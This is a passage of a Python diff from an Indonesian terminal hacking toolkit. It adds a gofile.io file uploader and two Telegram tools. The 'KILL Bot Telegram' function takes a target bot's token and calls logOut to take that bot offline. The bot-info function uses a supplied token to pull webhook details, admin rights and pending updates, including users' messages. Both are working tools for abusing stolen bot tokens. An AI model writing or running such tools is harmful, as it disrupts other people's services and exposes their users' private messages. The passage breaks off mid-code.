+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠋⠁
+"""
+    os.system(f'echo "{ascii_photo}" | lolcat 2>/dev/null || echo "{ascii_photo}"')
+    
+    print(f"""
+{W}╭─────────────────────────────────────────────────────────────────╮
+{W}│ {W}Tools {R}: {G}File to URL {R}│ {W}Developer {R}: {G}Rullzzz06
+{W}╰─────────────────────────────────────────────────────────────────╯
+{W}╭─────────────────────────────────────────────────────────────────╮
+{W}│ Masukkan Path file yang ingin di Upload Menjadi Link {R}/{W} URL
+{W}│ Contoh {R}:{a} /sdcard/folder/file
+{W}╰─────────────────────────────────────────────────────────────────╯""")
+    file_path = input(f"{U}❯❯❯ {W}Path file {G}❯{N} ").strip()
+    
+    if not file_path:
+        print(f"\n{W}[ {R}??{W} ] Path tidak boleh kosong!{N}")
+        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
+        return
+    
+    if not os.path.exists(file_path):
+        print(f"\n{W}[ {R}??{W} ] File tidak ditemukan!{N}")
+        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
+        return
+    
+    file_size = os.path.getsize(file_path) / (1024 * 1024)
+    if file_size > 10240:
+        print(f"\n{W}[ {R}??{W} ] File terlalu besar! Maksimal 10GB{N}")
+        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
+        return
+    
+    def load_bar_upload(stop_event):
+        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
+        RESET = '\x1b[0m'
+        length = 15
+        color_index = 0
+        while not stop_event.is_set():
+            for i in range(length + 1):
+                if stop_event.is_set():
+                    break
+                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
+                empty = '□' * (length - i)
+                sys.stdout.write(f'\r [ {G}✦{W} ] Mengupload File [[{filled_color}{empty}{W}]]')
+                sys.stdout.flush()
+                time.sleep(0.05)
+                color_index += 1
+        sys.stdout.write('\r' + ' ' * 120 + '\r')
+        sys.stdout.flush()
+    
+    def upload_gofile(file_path):
+        try:
+            session = requests.Session()
+            
+            resp = session.get('https://api.gofile.io/servers')
+            if resp.status_code != 200:
+                return None, f"Gagal mendapatkan server (HTTP {resp.status_code})"
+            
+            server_data = resp.json()
+            if server_data.get('status') != 'ok':
+                return None, server_data.get('status', 'Unknown error')
+            
+            servers = server_data.get('data', {}).get('servers', [])
+            if not servers:
+                return None, "Tidak ada server tersedia"
+            
+            if isinstance(servers[0], dict):
+                server = servers[0].get('name')
+            else:
+                server = servers[0]
+            
+            if not server:
+                return None, "Server name tidak ditemukan"
+            
+            upload_url = f"https://{server}.gofile.io/uploadFile"
+            
+            filename = os.path.basename(file_path)
+            with open(file_path, 'rb') as f:
+                files = {'file': (filename, f)}
+                resp = session.post(upload_url, files=files, timeout=300)
+            
+            if resp.status_code == 200:
+                data = resp.json()
+                if data.get('status') == 'ok':
+                    url = data.get('data', {}).get('downloadPage')
+                    if url:
+                        return url, None
+                    else:
+                        return None, "Gagal mendapatkan URL"
+                else:
+                    return None, data.get('status', 'Unknown error')
+            else:
+                return None, f"HTTP {resp.status_code}"
+                
+        except requests.exceptions.Timeout:
+            return None, "Timeout, file mungkin terlalu besar"
+        except Exception as e:
+            return None, str(e)
+    
+    stop = threading.Event()
+    t = threading.Thread(target=load_bar_upload, args=(stop,))
+    t.daemon = True
+    t.start()
+    
+    url, error = upload_gofile(file_path)
+    
+    stop.set()
+    t.join()
+    
+    if url:
+        filename = os.path.basename(file_path)
+        file_size_kb = os.path.getsize(file_path) / 1024
+        
+        print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
+        print(f"{W}│ {G}✓{W} Upload Berhasil!{N}")
+        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
+        print(f"{W}│ {W}File      {R}: {G}{filename}{N}")
+        print(f"{W}│ {W}Size      {R}: {G}{file_size_kb:.2f} KB{N}")
+        print(f"{W}│ {W}URL       {R}: {G}{url}{N}")
+        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
+    else:
+        print(f"\n{W}[ {R}??{W} ] Upload gagal: {error}{N}")
+    
+    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
+
+def tool_bunuh_bot_telegram():
+    import os, sys, time, requests, json, threading
+    from datetime import datetime
+    
+    os.system('clear')
+    
+    R = '\033[91m'
+    G = '\033[92m'
+    Y = '\033[93m'
+    W = '\033[97m'
+    C = '\033[96m'
+    U = '\033[95m'
+    N = '\033[0m'
+    
+    ascii_kill = """
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣤⣤⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀
+⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀
+⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀
+⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀
+⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠁⠀⠀⢀⣠⠄⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀
+⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠁⠀⠀⠀⠀⢀⣤⡶⠟⠁⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⡿⠋⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⡀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
+⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣴⣾⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
+⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀
+⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
+⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣠⣶⣿⣶⣄⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀
+⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣾⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀
+⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠻⠿⠿⠿⠿⠿⠿⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+"""
+    os.system(f'echo "{ascii_kill}" | lolcat 2>/dev/null || echo "{ascii_kill}"')
+    
+    print(f"""
+{W}╭─────────────────────────────────────────────────────────────────╮
+{W}│ {W}Tools {R}: {G}KILL Bot Telegram {R}│ {W}Developer {R}: {G}Rullzzz06
+{W}╰─────────────────────────────────────────────────────────────────╯""")
+
+    def load_bar_kill(stop_event):
+        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
+        RESET = '\x1b[0m'
+        length = 15
+        color_index = 0
+        while not stop_event.is_set():
+            for i in range(length + 1):
+                if stop_event.is_set():
+                    break
+                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
+                empty = '□' * (length - i)
+                sys.stdout.write(f'\r [ {G}✦{W} ] Membunuh Bot [[{filled_color}{empty}{W}]]')
+                sys.stdout.flush()
+                time.sleep(0.05)
+                color_index += 1
+        sys.stdout.write('\r' + ' ' * 120 + '\r')
+        sys.stdout.flush()
+    
+    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
+    print(f"{W}│ Masukkan Token Bot Telegram target")
+    print(f"{W}│ Contoh {R}:{a} 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz")
+    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
+    
+    token = input(f"{U}❯❯❯ {W}Token Bot {G}❯{N} ").strip()
+    
+    if not token:
+        print(f"\n{W}[ {R}??{W} ] Token tidak boleh kosong!{N}")
+        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
+        return
+    
+    def telegram_bot_get_info(token):
+        url = f'https://api.telegram.org/bot{token}/getMe'
+        try:
+            resp = requests.get(url, timeout=10)
+            if resp.status_code == 200:
+                return resp.json()
+            return None
+        except:
+            return None
+    
+    def telegram_bot_kill(token):
+        url = f'https://api.telegram.org/bot{token}/logOut'
+        try:
+            resp = requests.get(url, timeout=10)
+            if resp.status_code == 200:
+                return resp.json()
+            return None
+        except:
+            return None
+    
+    stop = threading.Event()
+    t = threading.Thread(target=load_bar_kill, args=(stop,))
+    t.daemon = True
+    t.start()
+    
+    bot_info = telegram_bot_get_info(token)
+    
+    stop.set()
+    t.join()
+    
+    if not bot_info or not bot_info.get('ok'):
+        print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
+        print(f"{W}│ {R}✗{W} Token Bot Tidak Valid!{N}")
+        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
+        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
+        return
+    
+    bot_data = bot_info['result']
+    
+    print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
+    print(f"{W}│ {G}✓{W} Informasi Bot{N}")
+    print(f"{W}├─────────────────────────────────────────────────────────────────┤")
+    print(f"{W}│ {W}ID        {R}: {G}{bot_data.get('id', 'N/A')}{N}")
+    print(f"{W}│ {W}Username  {R}: {G}@{bot_data.get('username', 'N/A')}{N}")
+    print(f"{W}│ {W}Nama      {R}: {G}{bot_data.get('first_name', 'N/A')}{N}")
+    print(f"{W}│ {W}Bot       {R}: {G}{'Ya' if bot_data.get('is_bot', False) else 'Bukan Bot'}{N}")
+    print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
+    
+    confirm = input(f"{U}❯❯❯ {W}Ketik {G}KILL{W} untuk bunuh bot, atau {R}NO{W} batal {G}❯{N} ").strip().upper()
+    
+    if confirm == 'NO':
+        print(f"{W}[ {R}!!{W} ] Dibatalkan{N}")
+        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
+        return
+    
+    if confirm != 'KILL':
+        print(f"{W}[ {R}??{W} ] Input tidak valid!{N}")
+        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
+        return
+    
+    print(f"{W}[ {R}!!{W} ] Membunuh bot...{N}")
+    
+    stop = threading.Event()
+    t = threading.Thread(target=load_bar_kill, args=(stop,))
+    t.daemon = True
+    t.start()
+    
+    result = telegram_bot_kill(token)
+    
+    stop.set()
+    t.join()
+    
+    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
+    
+    if result and result.get('ok'):
+        print(f"{W}│ {G}✓{W} Bot Berhasil Dibunuh!{N}")
+        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
+        print(f"{W}│ {W}ID        {R}: {G}{bot_data.get('id', 'N/A')}{N}")
+        print(f"{W}│ {W}Username  {R}: {G}@{bot_data.get('username', 'N/A')}{N}")
+        print(f"{W}│ {W}Nama      {R}: {G}{bot_data.get('first_name', 'N/A')}{N}")
+        print(f"{W}│ {W}Status    {R}: {G}Succesfuly{N}")
+    else:
+        print(f"{W}│ {R}✗{W} Gagal Membunuh Bot!{N}")
+        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
+        print(f"{W}│ {W}ID        {R}: {G}{bot_data.get('id', 'N/A')}{N}")
+        print(f"{W}│ {W}Username  {R}: {G}@{bot_data.get('username', 'N/A')}{N}")
+        print(f"{W}│ {W}Nama      {R}: {G}{bot_data.get('first_name', 'N/A')}{N}")
+        print(f"{W}│ {W}Status    {R}: {R}failed{N}")
+    
+    print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
+    
+    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
+
+def tool_cek_bot_telegram():
+    import os, sys, time, requests, json, threading
+    from datetime import datetime
+    
+    os.system('clear')
+    
+    R = '\033[91m'
+    G = '\033[92m'
+    Y = '\033[93m'
+    W = '\033[97m'
+    C = '\033[96m'
+    U = '\033[95m'
+    N = '\033[0m'
+    
+    ascii_bot = """
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣤⣤⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀
+⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀
+⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀
+⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀
+⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠁⠀⠀⢀⣠⠄⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀
+⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠁⠀⠀⠀⠀⢀⣤⡶⠟⠁⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⡿⠋⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⡀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
+⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣴⣾⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
+⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀
+⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
+⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣠⣶⣿⣶⣄⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀
+⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣾⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀
+⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠻⠿⠿⠿⠿⠿⠿⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
+    os.system(f'echo "{ascii_bot}" | lolcat 2>/dev/null || echo "{ascii_bot}"')
+    
+    print(f"""
+{W}╭─────────────────────────────────────────────────────────────────╮
+{W}│ {W}Tools {R}: {G}Cek info Bot Telegram {R}│ {W}Developer {R}: {G}Rullzzz06
+{W}╰─────────────────────────────────────────────────────────────────╯""")
+    
+    def load_bar_info(stop_event):
+        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
+        RESET = '\x1b[0m'
+        length = 15
+        color_index = 0
+        while not stop_event.is_set():
+            for i in range(length + 1):
+                if stop_event.is_set():
+                    break
+                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
+                empty = '□' * (length - i)
+                sys.stdout.write(f'\r [ {G}✦{W} ] Mengambil Informasi Bot [[{filled_color}{empty}{W}]]')
+                sys.stdout.flush()
+                time.sleep(0.05)
+                color_index += 1
+        sys.stdout.write('\r' + ' ' * 120 + '\r')
+        sys.stdout.flush()
+    
+    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
+    print(f"{W}│ Masukkan {G}Token Bot Telegram")
+    print(f"{W}│ Contoh {R}:{a} 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz")
+    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
+    
+    token = input(f"{U}❯❯❯ {W}Masukkan Token Bot {G}❯{N} ").strip()
+    
+    if not token:
+        print(f"\n{W}[ {R}??{W} ] Token tidak boleh kosong!{N}")
+        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
+        return
+    
+    stop = threading.Event()
+    t = threading.Thread(target=load_bar_info, args=(stop,))
+    t.daemon = True
+    t.start()
+    
+    info = {}
+    
+    try:
+        resp = requests.get(f'https://api.telegram.org/bot{token}/getMe', timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('ok'):
+                info['getMe'] = data.get('result', {})
+        
+        resp = requests.get(f'https://api.telegram.org/bot{token}/getWebhookInfo', timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('ok'):
+                info['webhook'] = data.get('result', {})
+        
+        resp = requests.get(f'https://api.telegram.org/bot{token}/getUpdates', timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('ok'):
+                info['updates'] = data.get('result', [])
+        
+        resp = requests.get(f'https://api.telegram.org/bot{token}/getMyCommands', timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('ok'):
+                info['commands'] = data.get('result', [])
+        
+        resp = requests.get(f'https://api.telegram.org/bot{token}/getMyDefaultAdministratorRights', timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('ok'):
+                info['admin_rights'] = data.get('result', {})
+        
+        resp = requests.get(f'https://api.telegram.org/bot{token}/getMyName', timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('ok'):
+                info['name'] = data.get('result', {})
+        
+        resp = requests.get(f'https://api.telegram.org/bot{token}/getMyDescription', timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('ok'):
+                info['description'] = data.get('result', {})
+        
+        resp = requests.get(f'https://api.telegram.org/bot{token}/getMyShortDescription', timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('ok'):
+                info['short_description'] = data.get('result', {})
+        
+        resp = requests.get(f'https://api.telegram.org/bot{token}/getMyName?language_code=id', timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('ok'):
+                info['name_id'] = data.get('result', {})
+        
+    except Exception as e:
+        pass
+    
+    stop.set()
+    t.join()
+    
+    if not info.get('getMe'):
+        print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
+        print(f"{W}│ {R}✗{W} Token Bot Tidak Valid!{N}")
+        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
+        input(f"\n{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
+        return
+    
+    bot = info['getMe']
+    
+    json_output = {
+        "status": "success",
+        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        "bot_info": {
+            "id": bot.get('id', 'N/A'),
+            "username": f"@{bot.get('username', 'N/A')}",
+            "first_name": bot.get('first_name', 'N/A'),
+            "last_name": bot.get('last_name', ''),
+            "is_bot": bot.get('is_bot', False),
+            "can_join_groups": bot.get('can_join_groups', False),
+            "can_read_all_group_messages": bot.get('can_read_all_group_messages', False),
+            "supports_inline_queries": bot.get('supports_inline_queries', False),
+            "can_connect_to_business": bot.get('can_connect_to_business', False),
+            "has_main_webhook": bot.get('has_main_webhook', False),
+        },
+        "bot_name": info.get('name', {}).get('name', 'N/A'),
+        "bot_name_id": info.get('name_id', {}).get('name', 'N/A'),
+        "bot_description": info.get('description', {}).get('description', 'N/A'),
